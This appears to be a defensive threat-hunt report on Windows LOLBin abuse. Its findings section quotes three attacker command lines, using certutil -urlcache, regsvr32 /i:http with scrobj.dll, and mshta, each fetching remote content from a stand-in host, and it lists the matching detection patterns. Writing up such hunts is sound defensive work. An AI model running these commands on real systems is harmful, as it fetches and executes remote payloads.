# H04 - LOLBin download and proxy execution

PEAK type: **hypothesis-driven** | ATT&CK: **T1105** Ingress Tool Transfer, **T1218.010** Regsvr32, **T1218.005** Mshta | Status: **closed - new detection created**

## Prepare

**Hypothesis.** An attacker on a Northwind endpoint is using built-in, signed Windows binaries (certutil, regsvr32, mshta, bitsadmin) to fetch or run remote content, so no new executable has to touch disk first. The binaries run legitimately every week. The abuse is in the **command line**: a URL argument, `-urlcache`, `/i:http`, `scrobj.dll`. A per-host baseline of how often each binary normally runs shows whether the run is unusual for that host.

**Why this hypothesis now.** Current loader reporting describes LOLBAS fetch patterns as the second stage. Command lines are collected fleet-wide. Backlog priority 20.

**Data sources.** Process creation with full command line.

**Assumptions.**
- Command-line logging is complete. Truncated command lines would hide the URL.
- Obfuscation such as caret insertion or environment-variable expansion is out of scope for this iteration; that is noted as a gap in the pattern list.
- Legitimate use of these binaries with a network argument is rare and attributable to a known product.

**Scope.** 65 hosts, 14 days, the LOLBins in the pattern table (16 executions in total).

## Execute

**Method.** `hunt/hunts/h04_lolbin.py`; production `query.kql` / `query.spl`.

1. Baseline: count runs of each LOLBin per host over the period.
2. Match each run's command line against LOLBAS-style abuse patterns: certutil `-urlcache` / `-f http`, regsvr32 `/i:http` / `scrobj.dll` (Squiblydoo), mshta with a URL or script protocol, bitsadmin `/transfer`, powershell download cradles or `-enc`, rundll32 with `javascript:` or a URL.
3. Score = pattern weight x (0.6 + 0.4 x 1/host_runs), with a small boost for a destination in a documentation/test range. In production that would be an external IP with no reputation.

**Execution notes.** 16 LOLBin executions across the fleet; 3 matched an abuse pattern.

## Act with Knowledge

**Findings.** Three matches, all on **WKS-0042** (rbaxter) within 60 seconds on 2026-09-10 at 10:16, each scoring 100:
- `certutil.exe -urlcache -split -f http://198.51.100.23/update.txt %TEMP%\u.txt`
- `regsvr32.exe /s /n /u /i:http://198.51.100.23/x.sct scrobj.dll`
- `mshta.exe http://198.51.100.23/a.hta`

None of the three binaries had run on WKS-0042 before. See [`results.md`](results.md).

**False-positive review.** certutil ran nine other times (`-store my`, `-verify ca.cer`) from IT cert-store checks. Without a network argument, none matched. regsvr32 registered a Contoso shell extension from Program Files on the three admin hosts (MSI-driven, local path), also not matched. The rundll32 run with a DLL in a user Temp path has no URL and so is out of scope here, but it is not baseline either; it was pivoted to H02, where it ranks #1.

**Outcome.** True positive. 198.51.100.23 was blocked at the proxy. The second-stage files were recovered from the host for triage.

**Detection decision: new detection created.** Binary + network-argument pattern is a single-event condition with zero hits in the benign baseline. It graduated as [`H04-lolbin-remote-fetch`](../../hunt/detections/rules/h04_lolbin_download.yml) (3 alerts on the hunt data, 0 on the benign-only baseline). Follow-up: extend the patterns to cover command-line obfuscation (carets, quotes, `-urlca^che`) and add bitsadmin/`Start-BitsTransfer`.
